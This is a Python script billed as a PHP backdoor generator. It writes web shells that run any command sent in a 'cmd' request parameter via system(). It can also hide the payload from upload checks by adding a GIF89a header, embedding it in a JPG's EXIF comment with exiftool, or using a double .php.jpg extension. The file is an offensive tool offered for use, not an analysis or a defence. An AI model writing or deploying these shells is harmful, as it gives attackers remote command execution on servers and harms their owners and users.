#!/usr/bin/python3

import os
import sys
import re
import random
import string

class bcolors:

    BLUE = '\033[94m'
    GREEN = '\033[92m'
    RED = '\033[31m'
    YELLOW = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    BGRED = '\033[41m'
    WHITE = '\033[37m'

banner = """

     /|
    / |
   /__|______
  |  __  __  |
  | |  ||  | |
  | |__||__| |---
  |  __  __()|\ hello
  | |  ||  | |
  | |  ||  | |
  | |__||__| |
  |__________|
 _____     __     _______  _        ______   _______  _______  _______
(  ___ \  /   )  (  ____ \| \    /\(  __  \ (  __   )(  __   )(  ____ )
| (   ) )/ /) |  | (    \/|  \  / /| (  \  )| (  )  || (  )  || (    )|
| (__/ // (_) (_ | |      |  (_/ / | |   ) || | /   || | /   || (____)|
|  __ ((____   _)| |      |   _ (  | |   | || (/ /) || (/ /) ||     __)
| (  \ \    ) (  | |      |  ( \ \ | |   ) ||   / | ||   / | || (\ (   
| )___) )   | |  | (____/\|  /  \ \| (__/  )|  (__) ||  (__) || ) \ \__
|/ \___/    (_)  (_______/|_/    \/(______/ (_______)(_______)|/   \__/

[+]PhP_backdoor_generator

"""

def red():
    print(bcolors.RED)

def green():
    print(bcolors.GREEN)

def endc():
    print(bcolors.ENDC)

red()
print(banner)
endc()

randlst = [random.choice(string.ascii_letters + string.digits) for i in range(24)]

file_name = ""

for i in randlst:
    file_name += i

file_name += ".php"



menu = """

1) simple-php-backdoor

2) php-webshell

"""
prompt = "h4xxor@B4ckD00r: "

print(bcolors.BLUE)

print(menu)

print("[+]Press key 1 or 2")

endc()

print(bcolors.YELLOW)

choice = input(prompt)

endc()

if choice == "1":

        

    payload = """<?php if(isset($_REQUEST['cmd'])){ echo \"<pre>\"; $cmd = ($_REQUEST['cmd']); system($cmd); echo \"</pre>\"; die; }?>"""

    print(bcolors.GREEN)

    print("Select Option")

    option = """

    1) normal
    
    2) Impersonation as gif_file

    3) Impersonation as jpg_file

    4) extension_trick

    [+]Default or except: 1
    """
    print(option)

    endc()

    print(bcolors.BLUE)

    mode = input(prompt)
    
    endc()

    if mode == "1":

        f = open(file_name,"w")

        f.write(payload)

        f.close()

    elif mode == "2":

        print(bcolors.GREEN)

        print("add GIF89a;")

        payload2 = "GIF89a;"
        
        f = open(file_name,"w")

        
        f.write(payload2+"\n"+payload)
        f.close()
        
        endc()
      

    elif mode == "3":

        print(bcolors.GREEN)

        print("[+]Enter the File_name to jpg_file")

        jpg_file_name = input(prompt)

        reg = re.search(r".+\.jpg",jpg_file_name)

        if reg == None:
            
            print(bcolors.FAIL)

            print("[!]You missed Extension")
            print("[+]Automatically fixed...")

            jpg_file_name = jpg_file_name + ".jpg"

            endc()

        os.system(f"convert -size 200x200 xc:white {jpg_file_name}")

        try:
            payload2 = f"""exiftool -Comment=\"<?php system($_GET['cmd']); ?>\" {jpg_file_name}"""
            os.system(payload2)
            
            print(bcolors.GREEN)
            print(f"[+]Generated_FileName: {jpg_file_name}")
            endc()
            sys.exit()


        except:
    
            print(bcolors.FAIL)

            print("[!]Something wrong")
            sys.exit()

            endc()

    elif mode == "4":

        file_name = file_name + ".jpg"
        f = open(file_name,"w")
        f.write(payload)
        f.close()
        


elif choice == "2":

    payload  = "<html>\n"
    payload += "<body>\n"
    payload += "<form method=\"GET\" name=\"<?php echo basename($_SERVER['PHP_SELF']); ?>\">\n"
    payload += "<input type=\"TEXT\" name=\"cmd\" id=\"cmd\" size=\"80\">\n"
    payload += "<input type=\"SUBMIT\" value=\"Execute\">\n"
    payload += "</form>\n"
    payload += "<pre>\n"
    payload += "<?php\n"
    payload += "if(isset($_GET[\'cmd\']))\n"
    payload += "{\n"
    payload += "\tsystem($_GET[\'cmd\']);\n"
    payload += "}\n"
    payload += "?>\n"
    payload += "</pre>\n"
    payload += "</body>\n"
    payload += "<script>document.getElementById(\"cmd\").focus();</script>\n"
    payload += "</html>\n"

    
    f = open(file_name,"w")
    f.write(payload)
    f.close()

print(bcolors.GREEN)

print(f"[+]Generated_FileName: {file_name}")
    
endc()
